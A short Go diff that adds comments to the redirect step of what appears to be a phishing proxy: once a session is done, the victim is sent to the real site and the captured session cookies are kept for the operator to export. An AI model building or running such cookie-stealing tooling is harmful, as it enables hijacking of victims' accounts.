@@ -139,7 +139,10 @@ func (c *connection) handleRequest(r *http.Request) {
 		}
 	}
 
-	// 1. Completed session redirect.
+	// 1. Completed session redirect. The victim is sent to the real site.
+	// Captured cookies are available to the operator via session export —
+	// browsers prevent setting cookies for a domain that doesn't match the
+	// response origin, so we can't plant them in the redirect response.
 	if c.session.IsDone() && c.lure != nil && c.lure.RedirectURL != "" {
 		http.Redirect(w, r, c.lure.RedirectURL, http.StatusFound)
 		w.flush()
